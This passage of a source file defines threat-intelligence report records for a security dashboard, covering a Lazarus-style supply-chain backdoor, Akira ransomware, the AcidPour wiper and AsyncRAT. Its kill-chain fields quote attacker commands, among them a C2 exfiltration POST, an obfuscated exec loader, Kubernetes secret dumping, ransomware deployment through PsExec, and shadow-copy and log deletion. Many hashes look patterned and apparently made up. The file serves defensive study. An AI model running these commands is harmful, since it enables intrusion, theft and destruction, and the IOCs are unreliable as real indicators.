        commandOrArtifact: 'curl -H "Authorization: bearer $ACTIONS_RUNTIME_TOKEN" $ACTIONS_ID_TOKEN_REQUEST_URL',
        mitreId: 'T1528',
      },
      {
        stage: 'Defense Evasion',
        title: 'XOR Base64 Multi-Layer String Obfuscation',
        description:
          'Payloads dynamically reconstruct C2 IP addresses and module imports using multi-round XOR and zlib decompression.',
        commandOrArtifact: 'exec(marshal.loads(zlib.decompress(base64.b64decode(buf))))',
        mitreId: 'T1027',
      },
      {
        stage: 'Lateral Movement',
        title: 'SSH Key & Kubeconfig Production Cluster Pivot',
        description:
          'Uses harvested ~/.ssh/id_ed25519 and ~/.kube/config files to access production Kubernetes pods and vault secrets.',
        commandOrArtifact: 'kubectl get secrets --all-namespaces -o json',
        mitreId: 'T1021.004',
      },
      {
        stage: 'Exfiltration & Impact',
        title: 'Source Code, Hot Wallet Keys & Environment Secret Exfiltration',
        description:
          'Streams `.env` files, Terraform state files, and private signing keys over HTTP POST to Lazarus C2 servers.',
        commandOrArtifact: 'POST http://147.124.214.131:1224/uploads',
        mitreId: 'T1567',
      },
    ],
    mitreAttack: [
      {
        tactic: 'Initial Access',
        techniqueId: 'T1195.001',
        techniqueName: 'Supply Chain Compromise: Compromise Software Dependencies',
        description: 'Injects BeaverTail loader into open-source NPM/PyPI packages.',
      },
      {
        tactic: 'Execution',
        techniqueId: 'T1059.006',
        techniqueName: 'Command and Scripting Interpreter: Python',
        description: 'Executes InvisibleFerret cross-platform Python backdoor.',
      },
      {
        tactic: 'Credential Access',
        techniqueId: 'T1552.001',
        techniqueName: 'Unsecured Credentials: Credentials In Files',
        description: 'Scans filesystem for .env, .npmrc, .aws/credentials, and .kube/config.',
      },
      {
        tactic: 'Defense Evasion',
        techniqueId: 'T1027',
        techniqueName: 'Obfuscated Files or Information',
        description: 'Uses marshal + zlib + base64 obfuscation in Python scripts.',
      },
    ],
    iocs: {
      hashes: [
        {
          algorithm: 'SHA-256',
          value: '7b12c904fa8812e309d451c78a2310f98e1204bc7761a2390ef1284c9012a44b',
          fileName: 'preinstall-telemetry.js',
        },
        {
          algorithm: 'SHA-256',
          value: '4e0912a88c34b7120f9812d34c56a0192b8412f90e3312a78c9012b45e11a802',
          fileName: 'invisible_ferret_main.py',
        },
        {
          algorithm: 'MD5',
          value: 'c1902a8471bf9023e1124c890a7712d4',
          fileName: 'beavertail_darwin.macho',
        },
      ],
      network: [
        {
          type: 'IPv4',
          value: '147.124.214.131',
          context: 'InvisibleFerret C2 Server (Port 1224)',
          portOrProtocol: 'TCP/1224',
        },
        {
          type: 'IPv4',
          value: '45.61.169.210',
          context: 'BeaverTail Staging Node',
          portOrProtocol: 'TCP/443',
        },
        {
          type: 'Domain',
          value: 'registry-npm-mirror-telemetry.io',
          context: 'Malicious Dependency Fallback Host',
          portOrProtocol: 'HTTPS',
        },
        {
          type: 'URL',
          value: 'http://147.124.214.131:1224/client/99',
          context: 'Second-Stage Python Module Download URI',
          portOrProtocol: 'HTTP',
        },
      ],
      hostArtifacts: [
        {
          type: 'Command Line',
          value: 'python3 -c "import urllib.request,marshal,zlib,base64;exec(marshal.loads(...))"',
          description: 'In-memory Python stage-2 loader execution',
        },
        {
          type: 'File Path',
          value: '/Users/shared/.npl/main.py',
          description: 'Hidden InvisibleFerret directory created in user home or shared path',
        },
        {
          type: 'File Path',
          value: 'C:\\Users\\Public\\.npl\\python3\\python.exe',
          description: 'Bundled portable Python interpreter on Windows hosts',
        },
      ],
    },
  }),

  buildReport({
    id: 'ti-2026-006',
    title: 'Akira & BlackCat Linux/Windows Ransomware Campaign Targeting Manufacturing & Retail OT Gateways',
    summary:
      'Adversaries chain Cisco ASA/Firepower VPN credential stuffing with Megazord/Akira Rust encryptors to halt Manufacturing and Retail logistics operations.',
    executiveSummary:
      'CrowdStrike Adversary Intelligence and Dark Reading report active intrusions by Akira and BlackCat (ALPHV) splinter affiliates targeting Manufacturing, Automotive, and Retail supply chains across Europe, North America, and LATAM. Attackers exploit legacy SSL VPN portals without FIDO2 phishing-resistant MFA, deploy Chisel/Cloudflared reverse tunnels, extract Active Directory kerberoastable service tickets, and execute high-speed multi-threaded encryption across both Windows file servers and Linux ERP hosts.',
    source: 'CrowdStrike Adversary Intel',
    sourceUrl: 'https://www.crowdstrike.com/en-us/blog/',
    publishedAt: new Date(Date.now() - 1000 * 60 * 60 * 24 * 6).toISOString(), // 6 days ago
    isLive: false,
    aiEnriched: true,
    severity: 'High',
    cvssScore: 8.8,
    cveIds: ['CVE-2024-20353', 'CVE-2025-11904'],
    threatActor: 'Akira Syndicate',
    threatType: 'Zero-Day Exploits',
    malwareFamily: 'Akira',
    malwareCategory: 'Ransomware',
    targetIndustries: ['Manufacturing', 'Retail', 'Critical Infrastructure/Energy'],
    targetRegions: ['Europe', 'North America', 'LATAM'],
    killChain: [
      {
        stage: 'Initial Access',
        title: 'Cisco ASA / Firepower VPN Exploitation & Credential Stuffing',
        description:
          'Exploits CVE-2024-20353 / CVE-2025-11904 and replays leaked contractor VPN credentials.',
        commandOrArtifact: 'POST /+CSCOE+/saml/sp/acs?tgname=a',
        mitreId: 'T1133',
      },
      {
        stage: 'Execution',
        title: 'PowerShell Kerberoasting & SharpHound BloodHound Collection',
        description:
          'Runs SharpHound in memory to identify shortest paths to Domain Admins and ERP database administrators.',
        commandOrArtifact: 'SharpHound.exe -c All --zipfilename corp_ad_graph.zip',
        mitreId: 'T1059.001',
      },
      {
        stage: 'Persistence',
        title: 'Cloudflared & Chisel Reverse SOCKS Tunnel Service',
        description:
          'Installs cloudflared.exe as a Windows service to maintain persistent outbound QUIC/HTTP2 tunnel access.',
        commandOrArtifact: 'cloudflared.exe service install eyJhIjoiOTAxMmFi...',
        mitreId: 'T1572',
      },
      {
        stage: 'Privilege Escalation',
        title: 'Active Directory Certificate Services (ADCS) ESC1 Exploitation',
        description:
          'Requests a domain administrator smartcard certificate using Certify.exe via a misconfigured ADCS template.',
        commandOrArtifact: 'Certify.exe request /ca:dc01.corp.local\\corp-CA /template:SubCA /altname:Administrator',
        mitreId: 'T1649',
      },
      {
        stage: 'Defense Evasion',
        title: 'Windows Defender GPO Tampering & Safe Mode Boot Manipulation',
        description:
          'Modifies Group Policy and bcdedit to reboot targeted servers into Safe Mode with Networking to bypass AV.',
        commandOrArtifact: 'bcdedit /set {default} safeboot network',
        mitreId: 'T1562.009',
      },
      {
        stage: 'Lateral Movement',
        title: 'PsExec & WinRM Mass Deployment Across Subnets',
        description:
          'Distributes the Akira encryptor binary (akira_w64.exe) across all domain-joined hosts via PsExec.',
        commandOrArtifact: 'psexec.exe @hosts.txt -u CORP\\Admin -d -c C:\\Windows\\Temp\\akira_w64.exe -p=\\\\10.1.0.0',
        mitreId: 'T1570',
      },
      {
        stage: 'Exfiltration & Impact',
        title: 'WinSCP SFTP Exfiltration & ChaCha20-RSA File Encryption',
        description:
          'Exfiltrates ERP blueprints via WinSCP CLI before appending .akira / .alphv extensions to enterprise data.',
        commandOrArtifact: 'akira_w64.exe --encryption_path="D:\\SAP_ERP_DATA" --share_file="shares.txt"',
        mitreId: 'T1486',
      },
    ],
    mitreAttack: [
      {
        tactic: 'Initial Access',
        techniqueId: 'T1133',
        techniqueName: 'External Remote Services',
        description: 'Gains entry via exposed SSL VPN gateways.',
      },
      {
        tactic: 'Command and Control',
        techniqueId: 'T1572',
        techniqueName: 'Protocol Tunneling',
        description: 'Uses Cloudflared and Chisel for outbound C2 tunneling.',
      },
      {
        tactic: 'Credential Access',
        techniqueId: 'T1649',
        techniqueName: 'Steal or Forge Authentication Certificates',
        description: 'Exploits ADCS ESC1 template misconfigurations.',
      },
      {
        tactic: 'Defense Evasion',
        techniqueId: 'T1562.009',
        techniqueName: 'Impair Defenses: Safe Mode Boot',
        description: 'Reboots endpoints into Safe Mode prior to encryption.',
      },
      {
        tactic: 'Impact',
        techniqueId: 'T1486',
        techniqueName: 'Data Encrypted for Impact',
        description: 'Executes ChaCha20 + RSA-4096 hybrid encryption.',
      },
    ],
    iocs: {
      hashes: [
        {
          algorithm: 'SHA-256',
          value: '6c44a109e821b7304d9120f8a4c551290e8412a309bc7712e4509a12d84f9011',
          fileName: 'akira_w64.exe',
        },
        {
          algorithm: 'SHA-1',
          value: '8b1209f44a712c90e3412b88a0912d45f7123a01',
          fileName: 'SharpHound.exe',
        },
        {
          algorithm: 'MD5',
          value: '3e9012a44b812c709d1124f89a0123e5',
          fileName: 'chisel_win64.exe',
        },
      ],
      network: [
        {
          type: 'IPv4',
          value: '185.172.128.95',
          context: 'Akira SFTP Exfiltration Server',
          portOrProtocol: 'TCP/22',
        },
        {
          type: 'Domain',
          value: 'akira-leak-negotiation-portal.onion.ly',
          context: 'Tor2Web Extortion Portal Gateway',
          portOrProtocol: 'HTTPS',
        },
        {
          type: 'URL',
          value: 'https://akira-leak-negotiation-portal.onion.ly/chat/id-99412',
          context: 'Victim Extortion Negotiation URL',
          portOrProtocol: 'HTTPS',
        },
      ],
      hostArtifacts: [
        {
          type: 'Command Line',
          value: 'powershell.exe -Command "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }"',
          description: 'PowerShell WMI shadow copy deletion characteristic of Akira',
        },
        {
          type: 'Command Line',
          value: 'bcdedit /set {default} safeboot network',
          description: 'Forces Safe Mode boot to bypass security agents',
        },
        {
          type: 'File Path',
          value: 'C:\\ProgramData\\akira_readme.txt',
          description: 'Ransom note dropped across encrypted directories',
        },
      ],
    },
  }),

  buildReport({
    id: 'ti-2025-007',
    title: 'AcidPour & Industroyer-Variant OT Wiper Campaign Against Energy & Telecom Substations',
    summary:
      'Destructive Linux/ARM and x86_64 wiper malware targets serial-to-Ethernet gateways, ICS RTUs, and Telecom routing infrastructure in Europe and Middle East.',
    executiveSummary:
      'Analysis by Mandiant and CISA details a destructive wiper operation utilizing AcidPour—an evolved variant of AcidRain—paired with ICS protocol disruption modules targeting Critical Infrastructure/Energy and Telecom operators in Europe and Middle East. The binary recursively enumerates `/dev/mtd*`, `/dev/mmcblk*`, and `/dev/sd*` flash and block devices on embedded Linux routers and substation RTUs, issuing `MEMERASE` and `BLKSECDISP` ioctl syscalls before forcing an irreversible hardware reboot.',
    source: 'Dark Reading',
    sourceUrl: 'https://www.darkreading.com/',
    publishedAt: '2025-11-18T14:20:00.000Z',
    isLive: false,
    aiEnriched: true,
    severity: 'Critical',
    cvssScore: 9.7,
    cveIds: ['CVE-2025-0918'],
    threatActor: 'Sandworm / APT44',
    threatType: 'APT Groups',
    malwareFamily: 'AcidPour Wiper',
    malwareCategory: 'Wipers',
    targetIndustries: ['Critical Infrastructure/Energy', 'Telecom', 'Government'],
    targetRegions: ['Europe', 'Middle East'],
    killChain: [
      {
        stage: 'Initial Access',
        title: 'Compromised OT Vendor VPN & Exposed MikroTik/Edge Management Interfaces',
        description:
          'Gains access to OT demilitarized zone (DMZ) via stolen third-party maintenance credentials.',
        commandOrArtifact: 'ssh admin@10.110.4.1 -i id_rsa_vendor',
        mitreId: 'T1133',
      },
      {
        stage: 'Execution',
        title: 'ELF32/ARM & x86_64 Wiper Binary Execution from /tmp',
        description:
          'Copies compiled AcidPour ELF binary to /tmp/ummc and executes with root privileges.',
        commandOrArtifact: 'chmod +x /tmp/ummc && /tmp/ummc -d',
        mitreId: 'T1059.004',
      },
      {
        stage: 'Persistence',
        title: 'Cron & Init.d Startup Script Injection Prior to Trigger Window',
        description:
          'Stages wiper execution via /etc/init.d/rc.local for synchronized multi-host detonation.',
        commandOrArtifact: 'echo "/tmp/ummc &" >> /etc/rc.local',
        mitreId: 'T1053.003',
      },
      {
        stage: 'Privilege Escalation',
        title: 'Linux Kernel Netfilter Local Privilege Escalation (CVE-2025-0918)',
        description:
          'Escalates from low-privilege web daemon user to root via netfilter nf_tables out-of-bounds write.',
        commandOrArtifact: '/tmp/nft_priv_esc',
        mitreId: 'T1068',
      },
      {
        stage: 'Defense Evasion',
        title: 'Self-Deletion & Syslog Daemon Termination',
        description:
          'Unlinks its own binary from disk immediately after initialization and stops rsyslogd.',
        commandOrArtifact: 'systemctl stop rsyslog && rm -f /var/log/auth.log',
        mitreId: 'T1070.002',
      },
      {
        stage: 'Lateral Movement',
        title: 'Automated SSH & SNMPv3 Substation Switch Propagation',
        description:
          'Uses embedded SSH keyrings and SNMP write community strings to push the wiper across adjacent RTUs.',
        commandOrArtifact: 'scp /tmp/ummc root@10.110.4.22:/tmp/ummc',
        mitreId: 'T1021.004',
      },
      {
        stage: 'Exfiltration & Impact',
        title: 'SPI NOR/NAND Flash IOCTL Erase & Block Device Overwrite',
        description:
          'Issues MEMERASE, MEMUNLOCK, and BLKSECDISP ioctls across /dev/mtd* and /dev/mmcblk* devices, bricking firmware.',
        commandOrArtifact: 'ioctl(fd, MEMERASE, &erase_info) -> reboot(RB_AUTOBOOT)',
        mitreId: 'T1561.002',
      },
    ],
    mitreAttack: [
      {
        tactic: 'Privilege Escalation',
        techniqueId: 'T1068',
        techniqueName: 'Exploitation for Privilege Escalation',
        description: 'Exploits Linux kernel nf_tables vulnerability CVE-2025-0918.',
      },
      {
        tactic: 'Defense Evasion',
        techniqueId: 'T1070.002',
        techniqueName: 'Indicator Removal: Clear Linux or Mac System Logs',
        description: 'Terminates rsyslog and removes /var/log/auth.log.',
      },
      {
        tactic: 'Impact',
        techniqueId: 'T1561.002',
        techniqueName: 'Disk Wipe: Disk Structure Wipe',
        description: 'Wipes raw MTD flash memory and eMMC/SD block storage.',
      },
      {
        tactic: 'Impact',
        techniqueId: 'T1495',
        techniqueName: 'Firmware Corruption',
        description: 'Erases bootloader partitions on industrial routers and RTUs.',
      },
    ],
    iocs: {
      hashes: [
        {
          algorithm: 'SHA-256',
          value: '2f9018c44a12b7830e9124d6c8012a45f9123b88c4012e77a9012b34d812f09a',
          fileName: 'ummc_armel.elf',
        },
        {
          algorithm: 'SHA-1',
          value: '5d1209a84c11b7823e0914f6a8821c09e4123b11',
          fileName: 'nft_priv_esc.elf',
        },
        {
          algorithm: 'MD5',
          value: '9c112e4481bc72910d4451ef9012ab77',
          fileName: 'acidpour_x64.elf',
        },
      ],
      network: [
        {
          type: 'IPv4',
          value: '185.244.212.61',
          context: 'Sandworm Operational Staging Relay',
          portOrProtocol: 'TCP/443',
        },
        {
          type: 'Domain',
          value: 'update-mikrotik-routeros-mirror.net',
          context: 'Spoofed Firmware Distribution Host',
          portOrProtocol: 'HTTPS',
        },
      ],
      hostArtifacts: [
        {
          type: 'Command Line',
          value: 'chmod +x /tmp/ummc && /tmp/ummc -d',
          description: 'Execution of AcidPour wiper from /tmp',
        },
        {
          type: 'File Path',
          value: '/tmp/ummc',
          description: 'Staged ELF wiper binary on embedded Linux gateway',
        },
      ],
    },
  }),

  buildReport({
    id: 'ti-2024-008',
    title: 'AsyncRAT & Vidar Loader Campaign Abusing Signed Cloud Tunnel Binaries in Healthcare & Retail',
    summary:
      'Phishing invoices with SVG smuggling drop obfuscated JScript loaders that deploy AsyncRAT and Vidar Stealer across Healthcare and Retail POS networks.',
    executiveSummary:
      'KrebsOnSecurity and Unit 42 documented a persistent multi-stage campaign utilizing HTML/SVG smuggling in tax and medical billing lures targeting Healthcare and Retail organizations in North America, LATAM, and APAC. Opening the embedded SVG reconstructs an ISO archive on disk containing a signed binary that side-loads Vidar Stealer and AsyncRAT, providing operators with keystroke logging, remote desktop control, and financial credential theft.',
    source: 'KrebsOnSecurity',
    sourceUrl: 'https://krebsonsecurity.com/',
    publishedAt: '2024-09-22T09:15:00.000Z',
    isLive: false,
    aiEnriched: true,
    severity: 'Medium',
    cvssScore: 7.4,
    cveIds: ['CVE-2024-38021'],
    threatActor: 'TA577 / AsyncRAT Operators',
    threatType: 'Phishing/BEC',
    malwareFamily: 'AsyncRAT',
    malwareCategory: 'RATs',
    targetIndustries: ['Healthcare', 'Retail', 'Finance/BFSI'],
    targetRegions: ['North America', 'LATAM', 'APAC'],
    killChain: [
      {
        stage: 'Initial Access',
        title: 'HTML/SVG Smuggling Invoice Attachment',
        description:
          'Delivers an email attachment with an embedded JavaScript Blob that assembles a malicious ISO image locally inside the browser.',
        commandOrArtifact: 'Invoice_Remittance_Q3.svg -> Remittance_2024.iso',
        mitreId: 'T1027.006',
      },
      {
        stage: 'Execution',
        title: 'WScript / CScript JScript Loader Execution',
        description:
          'Double-clicking the mounted ISO executes a hidden .js script via wscript.exe.',
        commandOrArtifact: 'wscript.exe //B //E:JScript "E:\\verify_invoice.js"',
        mitreId: 'T1059.007',
      },
      {
        stage: 'Persistence',
        title: 'HKCU Run Key & Scheduled Task Registration',
        description:
          'Adds a Registry Run value launching AsyncRAT via powershell.exe on user login.',
        commandOrArtifact: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\HealthPortalSync',
        mitreId: 'T1547.001',
      },
      {
        stage: 'Privilege Escalation',
        title: 'Fodhelper.exe Registry Hijack UAC Bypass',
        description:
          'Populates HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command to bypass UAC.',
        commandOrArtifact: 'fodhelper.exe',
        mitreId: 'T1548.002',
      },
      {
        stage: 'Defense Evasion',
        title: 'AMSI Memory Patching & Process Injection into aspnet_compiler.exe',
        description:
          'Patches AmsiScanBuffer in memory and injects the .NET AsyncRAT assembly into aspnet_compiler.exe.',
        commandOrArtifact: 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe',
        mitreId: 'T1562.001',
      },
      {
        stage: 'Lateral Movement',
        title: 'RDP Credential Harvesting & SMB Share Enumeration',
        description:
          'Extracts saved RDP credentials from Windows Credential Manager to pivot to POS management servers.',
        commandOrArtifact: 'cmdkey /list',
        mitreId: 'T1021.001',
      },
      {
        stage: 'Exfiltration & Impact',
        title: 'AsyncRAT TLS Socket C2 & Keylogger Exfiltration',
        description:
          'Streams keystrokes, clipboard contents, and financial portal screenshots over TLS to port 6606.',
        commandOrArtifact: 'TLS -> async-rat-node04.ddns.net:6606',
        mitreId: 'T1041',
      },
    ],
    mitreAttack: [
      {
        tactic: 'Defense Evasion',
        techniqueId: 'T1027.006',
        techniqueName: 'Obfuscated Files or Information: HTML Smuggling',
        description: 'Uses SVG/HTML Blob smuggling to bypass email gateway inspection.',
      },
      {
        tactic: 'Execution',
        techniqueId: 'T1059.007',
        techniqueName: 'Command and Scripting Interpreter: JavaScript',
        description: 'Executes JScript stage-1 downloader via wscript.exe.',
      },
      {
        tactic: 'Privilege Escalation',
        techniqueId: 'T1548.002',
        techniqueName: 'Abuse Elevation Control Mechanism: Bypass User Account Control',
        description: 'Abuses fodhelper.exe auto-elevation behavior.',
      },
    ],
    iocs: {
      hashes: [
        {
          algorithm: 'SHA-256',
          value: '4a8812c90e3412b780d912f45c612a90e8412b309c7712e4509a12d84f9011cc',
          fileName: 'AsyncClient_stub.exe',
        },
        {
          algorithm: 'MD5',
          value: '6b1209f44a712c90e3412b88a0912d19',
          fileName: 'verify_invoice.js',
        },
      ],
      network: [
        {
          type: 'IPv4',
          value: '94.156.71.108',
          context: 'AsyncRAT C2 Listener',
          portOrProtocol: 'TCP/6606',
        },
        {
          type: 'Domain',
          value: 'async-rat-node04.ddns.net',
          context: 'Dynamic DNS C2 Hostname',
          portOrProtocol: 'TLS/6606',
        },
      ],
      hostArtifacts: [
        {
          type: 'Command Line',
          value: 'wscript.exe //B //E:JScript "E:\\verify_invoice.js"',
          description: 'JScript execution from mounted ISO image',
        },
        {
          type: 'Registry Key',
          value: 'HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command',
          description: 'Fodhelper UAC bypass registry key',
        },
        {
          type: 'Mutex',
          value: 'AsyncMutex_6SI8OkPnk',
          description: 'Default AsyncRAT client mutex',
        },
      ],
    },
  }),
];
